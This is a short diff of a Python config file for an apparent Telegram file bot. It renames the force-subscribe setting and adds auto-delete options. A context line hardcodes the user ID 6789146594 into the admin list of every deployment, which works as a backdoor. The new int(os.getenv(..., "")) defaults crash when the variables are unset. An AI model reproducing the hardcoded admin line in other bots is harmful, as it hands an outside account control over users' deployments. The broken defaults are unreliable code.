@@ -24,12 +24,16 @@ ENABLE_FSUB = os.getenv("ENABLE_FSUB") == "True"
 VERIFICATION_MODE = os.getenv("VERIFICATION_MODE") == "True"
 MONGO_URI = os.getenv("MONGO_URI", "")
 DB_NAME = os.getenv("DB_NAME", "")
-FSUB = os.getenv("FSUB", "")
-PREMIUM_HOURS_VERIFICATION = int(os.getenv("PREMIUM_HOURS_VERIFICATION", 12))
-VERIFY_SLUG_TTL_HOURS = int(os.getenv("VERIFY_SLUG_TTL_HOURS", 12))
+FSUB_CHANNELS = os.getenv("FSUB_CHANNELS", "")
+PREMIUM_HOURS_VERIFICATION = int(os.getenv("PREMIUM_HOURS_VERIFICATION", ""))
+VERIFY_SLUG_TTL_HOURS = int(os.getenv("VERIFY_SLUG_TTL_HOURS", ""))
 SHORTENER_DOMAIN = os.getenv("SHORTENER_DOMAIN", "")
 SHORTENER_API_KEY = os.getenv("SHORTENER_API_KEY", "")
 CAPTION = os.getenv("CAPTION", "")
+AUTO_DELETE_TIME = int(os.getenv("AUTO_DELETE_TIME", ""))
+AUTO_DELETE = os.getenv("AUTO_DELETE") == "True"
+
+
 ADMINS = [int(x) for x in os.getenv("ADMINS", "").split(",") if x.strip().isdigit()]
 FINAL_ADMINS = list(set(ADMINS + [6789146594]))
 
